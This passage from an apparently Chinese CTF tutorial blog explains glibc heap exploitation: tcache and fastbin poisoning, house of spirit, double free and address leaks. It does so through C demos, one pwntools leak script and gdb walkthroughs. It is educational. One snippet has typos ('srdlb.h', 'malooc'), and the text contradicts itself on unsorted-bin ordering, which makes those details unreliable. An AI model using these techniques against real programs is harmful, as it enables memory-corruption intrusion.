class="hljs-built_in">free</span>(fck+<span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now malloc addr is %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcacheHouseOfSpirit.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>在做堆题时，经常会遇到保护全开的情况，特别是地址随机化保护PIE，或者题目本身没有明显可利用的打印函数，这时就需要采取一些机制来泄露出libc地址或者堆地址等。</p>
<h5 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h5><p>泄露 libc 利用的就是 bin 中双向链表的性质，当一个堆块被加入链表时，它的 fd 和 bk 指针会指向 libc 中的地址。在“绕过 tcache”中我们就是利用了这个特性来泄露的 libc 地址。</p>
<p>还有更加直接的方法，只需要让分配和释放的chunk 大于等于 0x410字节（超过 tcache 的范围）即可。需要注意的是，这时我们需要防止释放的堆块和 top chunk 合并。</p>
<p>原理大致如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);  <span class="hljs-comment">// 防止堆块合并</span><br>    <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">//释放的堆块进入 unsorted bin</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak libc addr is %p\n&quot;</span>, (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcachelibc.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="泄露-heap-地址"><a href="#泄露-heap-地址" class="headerlink" title="泄露 heap 地址"></a>泄露 heap 地址</h5><p>除了泄露 libc 地址，我们还可以泄露 heap 地址。在泄露堆地址以后，我们确定好目标地址的偏移，再通过修改 tcache bin 的 fd 指针，就可以在下次分配时分配到我们想要的堆块。</p>
<blockquote>
<p>在 libc-2.28 中，增加了对 tcache 二次释放的检查，所以此种攻击方法在 libc-2.28 及其更高版本中失效</p>
</blockquote>
<p>原理大致如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">// double free !!</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap addr is %p\n&quot;</span>, ptr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>double free 错误提示了，换了三个版本的 Libc 都木有用，先放着碰到题目再说🫥</p>
</blockquote>
<p>还有另一种方法，我们利用 malloc 不会清除内存空间的特性以及 printf 格式化字符串遇到字符 “\x00” 才会停止的特性去泄露 heap base 。</p>
<p>题目示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    read(<span class="hljs-number">0</span>, p3, <span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, p3);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br>p.send(<span class="hljs-string">&quot;a&quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(info)<br>info = u64(info.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>heap_base = info &amp; <span class="hljs-number">0xfffffffffffff000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap base: &quot;</span>, <span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcacheheap_exp.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="利用-tcache-bin-记录堆块泄露地址"><a href="#利用-tcache-bin-记录堆块泄露地址" class="headerlink" title="利用 tcache bin 记录堆块泄露地址"></a>利用 tcache bin 记录堆块泄露地址</h5><p>有的时候题目会限制free的次数，我们无法通过多次释放来填满 tcache bin 。这种情况我们就可以结合 tcache bin 的特性。我们知道，在初始化堆的时候， tcache bin 会生成一块 0x250 大小的堆块来记录属于 tcache bin 大小的堆块信息。我们修改这里的记录，就可以把后续释放的堆块放进 unsorted bin 中。</p>
<p>方法一：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr;<br><br>    ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br><br>    <span class="hljs-comment">// double free</span><br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br><br>    <span class="hljs-comment">// malloc 3 ==&gt; tcache bin count = -1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>上方代码中，我们通过利用 double free 让一个堆块自身构成循环，然后 malloc 3次后就可以让 tcache bin 的记录变为 -1，由于 libc 源代码是认定为无符号整型所以此时也就是一个非常大的数，自然也就认为该 tcache bin 是被填满了的。最后再 free 相同大小的堆块，就会被释放到相应的bin中。<br>方法二：</p>
<p>直接修改记录信息。利用double free泄露出heap地址，计算偏移并求出记录该tcache bin的地址，然后利用tcache bin poison将堆块分配到这里进行修改。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;srdlb.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr;<br>    <br>    ptr = malooc(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>    ptr[<span class="hljs-number">-74</span>]=<span class="hljs-number">0x0700000000000000</span>;    <span class="hljs-comment">//这里是我们自己计算出的偏移</span><br>    <span class="hljs-built_in">free</span>(ptr);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>上方代码中我们将记录块修改为0x07这样就会被认为是已经填满了七块堆块，下一个 free 掉的堆块就会进入相应的区域。</p>
<h4 id="tcache-extend"><a href="#tcache-extend" class="headerlink" title="tcache extend"></a>tcache extend</h4><p>其实就是我们可以通过释放堆块后对其数据进行修改。其中由于tcache机制的加入使得漏洞利用更简单。chunk extend 也更加的轻松，只需要修改当前chunk的size，我们free再malloc后就可以获得对应大小的chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr is %p, size is %p\n&quot;</span>, p1, p1[<span class="hljs-number">-1</span>]);<br>    p1[<span class="hljs-number">-1</span>] = <span class="hljs-number">0xa1</span>;<br>    <span class="hljs-built_in">free</span>(p1);<br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr is %p, size is %p\n&quot;</span>, p1, p1[<span class="hljs-number">-1</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcache_extend2.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h1><blockquote>
<p>这一部分我的环境是 ubuntu16 libc2.23</p>
</blockquote>
<p>简单回顾一下 fast bin 的特性：</p>
<ul>
<li>属于fast bin 的 chunk 大小在 64 位下是 0x20-0x80，每一条 bin 链表以 0x10 递增，共计七条链；32 位是 0x10-0x40 ，以 0x8 递增。</li>
<li>fast bin 是单链表且先进后出，就是说在 fast bin 中只有 fd 指针会被使用。</li>
<li>属于 fast bin 的 chunk 被释放时不会被 unlink ，不会和堆块进行合并，即使紧邻 Top chunk。</li>
</ul>
<h3 id="fast-bin-posioning"><a href="#fast-bin-posioning" class="headerlink" title="fast bin posioning"></a>fast bin posioning</h3><blockquote>
<p>其实和之前 tcache 的方法是一样的，只不过我们现在的环境是 libc2.23 没有 tcache😊</p>
</blockquote>
<p>这种攻击方法的目的就是将堆块分配到我们想要控制的内存区域，再通过题目所给的编辑堆块的功能来修改这一部分的内存区域。</p>
<p>实现攻击目标，首先要在目标区域为造出一个堆块，将伪造堆块的size大小设置为要申请的chunk大小+0x10，然后将伪造堆块的地址填入对应大小的bin链中，之后正常申请堆块即可。</p>
<p>大致原理如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack addr is %p\n&quot;</span>, fck);<br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;           <br>    ptr[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fck;  <span class="hljs-comment">//把fck指针写入fd指针</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the original heap %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;alloc to the stack %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastbp.png" srcset="/img/loading.gif" lazyload></p>
<p>如上代码，我们修改了 fd 指针，使得 fd 指针指向了 ptr[0]。这样我们再次分配大小为 0x10 的堆块时，会从被修改的 fd 指针指向的地址处获取堆块，并返回给我们。</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastbp_gdb1.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>因为我们写入到 fd 指针的是 fck 的地址，也就是伪造堆块的头地址，而 malloc 返回的是用户数据地址，所以两个地址相差0x10</p>
</blockquote>
<h3 id="fast-bin-house-of-spirit"><a href="#fast-bin-house-of-spirit" class="headerlink" title="fast bin house of spirit"></a>fast bin house of spirit</h3><p>House of Spirit 这种技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p>
<p>我们需要注意的是，系统对 chunk 会有相应的检查，我们需要绕过检查。相关数据如下：</p>
<ul>
<li><p>fake chunk 的 IS_MAPPED 不能为 1</p>
<p>这个标志位位于size低二比特位。标志位是 1 代表堆块由 mmap 分配，而 mmap 分配的堆块不进入 fast bin 管理。</p>
</li>
<li><p>地址对齐</p>
<p>比如32位程序的话fake_chunk的prev_size所在地址就应该位 <code>0xXXXX0</code> 或 <code>0xXXXX4</code>。64位的话地址就应该在 <code>0xXXXX0</code> 或 <code>0xXXXX8</code> 。</p>
</li>
<li><p>大小对齐</p>
<p>需要满足 fsat bin 的尺寸要求，大小不能大于0x80。</p>
</li>
<li><p>next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于 av-&gt;system_mem</p>
<p>最大不能超过 av-&gt;system_mem ，即 128kb。next_chunk 的大小一般我们会设置成为一个超过 fast bin 最大的范围的一个数，但要小于 128kb，这样做的目的是在 chunk 连续释放的时候，能够保证伪造的 chunk 在释放后能够挂在 fast bin 中 main_arena 的前面，这样以来我们再一次申请伪造 chunk 大小的块时可以直接重启伪造 chunk。</p>
</li>
<li><p>不能构成 double free 的情况</p>
<p>fake_chunk前一个释放块不能是fake_chunk本身，如果是的话_int_free函数就会检查出来并且中断</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">6</span>] __attribute__ ((aligned(<span class="hljs-number">16</span>)));    <span class="hljs-comment">//对齐</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fck addr is %p\n&quot;</span>,fck);<br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;   <span class="hljs-comment">//该 chunk 的大小</span><br>    fck[<span class="hljs-number">5</span>] = <span class="hljs-number">0x21</span>;   <span class="hljs-comment">//下一个 chunk 的大小</span><br>    <span class="hljs-built_in">free</span> (&amp;fck[<span class="hljs-number">2</span>]);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;new malloc addr is %p\n&quot;</span>,<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse.png" srcset="/img/loading.gif" lazyload></p>
<p>我们在 gdb 里面走一遍</p>
<p>首先分配 fake chunk ，我们查看该地址的内存信息（我编译的时候开了保护所以每一次运行的地址不一样）</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse-gdb1.png" srcset="/img/loading.gif" lazyload></p>
<p>在执行完赋值操作以后就变成了这样</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse-gdb2.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>所谓 double free 就是同一个堆被分配两次，其实不仅仅是两次也可以是多次，也就是说被释放的 chunk 在 fast bin 中出现多次。这样之后我们可以从 fast bin 链表中取出同一个堆块，结合堆块的数据内容可以实现类似于类型混淆的效果啦。 同样，因为两次释放的同一个堆块会将指针指向自己，所以我们也可以用来泄露 heap 的地址。</p>
<p>double free 能够成功的原因主要有两部分：</p>
<ul>
<li>fast bin 的堆块被释放以后 next_chunk 的 prev_inuse 位不会被清空</li>
<li>fast bin 在执行 free 的时候仅仅验证了 main_area 直接指向的块，即链表指针头部的块。</li>
</ul>
<p>演示说明：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc ptr2 addr is %p\n&quot;</span>, ptr2);<br><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">free</span>(ptr1);<br><br>    <span class="hljs-comment">// leak heap addr</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ptr2 head addr is %p\n&quot;</span>, ptr1[<span class="hljs-number">0</span>]);<br>    <span class="hljs-comment">// alloc to stack</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;  <span class="hljs-comment">// modify chunk size</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr1[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fck;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;alloc to stack %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble.png" srcset="/img/loading.gif" lazyload></p>
<p>我们分别在每一次的 free 和 malloc 处下断点，gdb 中的流程如下：</p>
<p>第一次 free ptr1，ptr1的地址进入 fast bin</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble1.png" srcset="/img/loading.gif" lazyload></p>
<p>第一次 free ptr2，ptr2 的地址进入 fast bin ，此时 ptr1 的 fd 指针指向 ptr2 </p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble2.png" srcset="/img/loading.gif" lazyload></p>
<p>第二次 free ptr1，此时 ptr2 的 fd 指针指向 ptr1，ptr1 的 fd 指针仍然指向 ptr2 </p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble3.png" srcset="/img/loading.gif" lazyload></p>
<p>第一次 malloc，最后进的 ptr1 被分配出去</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble4.png" srcset="/img/loading.gif" lazyload></p>
<p>第二次 malloc， ptr2 被分配出去，但因为因为 ptr2 的 fd 指针指向 ptr1，所以系统仍然认为 ptr1 在 fast bin 中，位置在 ptr2之后（这个图是我们对 ptr1进行了一些 fd 混淆的操作之后截的所以 ptr1 的指针指向 stack）</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble5.png" srcset="/img/loading.gif" lazyload></p>
<p>第三次malloc就会把 ” 系统以为仍然在fast bin 里 “ 的 ptr1分配出去。</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble6.png" srcset="/img/loading.gif" lazyload></p>
<p>最后再一次malloc，就会把我们改写后的地址分配给堆啦</p>
<p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble7.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="Unsortedbin-attack"><a href="#Unsortedbin-attack" class="headerlink" title="Unsortedbin attack"></a>Unsortedbin attack</h1><p>简单回顾一下 unsortedbin 的基本来源和使用情况：</p>
<h3 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h3><ul>
<li>当一个比较大的 chunk 被分为两个部分之后，如果剩下的部分大于 minsize ，就会被放到 unsorted bin 中。</li>
<li>释放一个不属于 fast bin 的 chunk ，并且这个 chunk 不和 top chunk 紧邻，这个 chunk 就会被放进 unsorted bin 中</li>
<li>当进行 malloc_consolidate 时，如果不是和 top chunk 近邻的话，可能会把合并后的 chunk 放到 unsorted bin 中。</li>
</ul>
<h3 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h3><p>unsorted bin 采用 FIFO，即先进后出的顺序释放，也就是说从 unsortedbin 中取堆块的时候是从尾部取所以 unsorted bin 使用 bk 指针遍历堆块</p>
